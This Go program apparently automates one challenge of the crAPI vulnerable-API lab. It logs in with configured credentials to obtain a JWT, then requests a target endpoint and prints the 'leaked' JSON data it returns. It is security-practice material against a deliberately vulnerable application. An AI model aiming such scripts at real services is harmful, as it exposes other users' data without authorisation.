package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	configurator "github.com/tomek-skrond/crapiconfigurator/v2"
)

func main() {
	// read config
	config, err := configurator.GetConfig("../challenge-automation/config.yaml")
	if err != nil {
		log.Fatalln(err)
	}

	loginurl := fmt.Sprintf("%s%s", config.Hostname, config.LoginURL)
	token := configurator.GetJWTToken(loginurl, config.Email, config.Password)

	url := fmt.Sprintf("%s%s", config.Hostname, config.TargetURL)

	fmt.Println("Leaked endpoint data is:")
	LeakedEndpoint(token, url)
}

func LeakedEndpoint(token, targeturl string) {
	client := configurator.CustomHttpClient()

	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Println(err)
	}

	req = configurator.ConfigureRequest(req, token)

	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	body, err := configurator.ReadBody(resp)
	if err != nil {
		log.Println(err)
	}

	var prettyJSON bytes.Buffer
	if err := json.Indent(&prettyJSON, body, "", "  "); err != nil {
		log.Println(err)
	}

	fmt.Println(prettyJSON.String())
}
